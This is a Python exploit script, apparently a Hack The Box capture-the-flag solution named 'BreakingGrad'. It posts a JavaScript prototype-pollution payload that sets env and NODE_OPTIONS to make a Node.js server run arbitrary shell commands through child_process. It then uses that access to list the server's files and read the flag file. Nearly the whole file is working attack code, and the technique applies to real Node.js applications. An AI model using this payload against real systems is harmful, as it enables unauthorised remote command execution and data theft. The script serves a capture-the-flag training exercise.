import sys
import requests
import json
import re

def send_payload(host, cmd):
    #RCE Payload
    payload = {
        "constructor": {
            "prototype": {
                "env": {
                    "x": f'console.log(require("child_process").execSync("{cmd}").toString())//'
                },
                "NODE_OPTIONS": "--require /proc/self/environ"
            }
        }
    }
    try:
        requests.post(f"http://{host}/api/calculate", json=payload, timeout=5)
        r = requests.get(f"http://{host}/debug/version", timeout=5)
        return r.text
    except Exception as e:
        print(f" Request failed: {e}")
        sys.exit(1)
#Run 'ls' and try to find a filename that starts with 'flag'
def find_flag_filename(host):
    output = send_payload(host, "ls")
    for line in output.splitlines():
        if line.startswith("flag"):
            return line.strip()
    print("Flag file not found in directory listing.")
    print(output)
    sys.exit(1)

#Run 'cat <filename>' and extract HTB{...} from the output
def get_flag(host, filename):
    output = send_payload(host, f"cat {filename}")
    flag = re.search(r"HTB\{.*?\}", output)
    if flag:
        print(f"Flag: {flag.group(0)}")
    else:
        print(output)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 BreakingGrad.py <ip:port>")
        sys.exit(1)

    target = sys.argv[1]
    flag_file = find_flag_filename(target)
    print(f"Found flag file: {flag_file}")
    get_flag(target, flag_file)
